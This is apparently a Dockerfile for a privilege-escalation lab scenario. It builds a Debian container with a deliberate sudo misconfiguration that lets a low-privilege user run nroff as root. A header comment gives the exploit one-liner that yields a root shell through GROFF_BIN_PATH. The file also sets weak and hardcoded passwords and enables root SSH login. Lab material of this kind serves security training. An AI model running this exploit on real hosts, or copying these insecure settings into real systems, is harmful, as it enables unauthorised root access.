FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_nroff
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/nroff as root
# Exploit: echo '/bin/sh' > groff; chmod +x groff; sudo GROFF_BIN_PATH=. nroff
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and groff (which provides nroff)
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        groff-base \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Verify nroff is installed
RUN which nroff && ls -la /usr/bin/nroff

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# nroff internally calls groff. When GROFF_BIN_PATH is set, it looks for
# the groff binary in that path. By creating a malicious "groff" script
# that spawns /bin/sh and pointing GROFF_BIN_PATH to its directory,
# the attacker gets a root shell.
# The key is allowing env_keep or using the env_reset exception so the
# environment variable GROFF_BIN_PATH is passed through to the command.
RUN echo "lowpriv ALL=(root) NOPASSWD: SETENV: /usr/bin/nroff" > /etc/sudoers.d/nroff && \
    chmod 440 /etc/sudoers.d/nroff

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]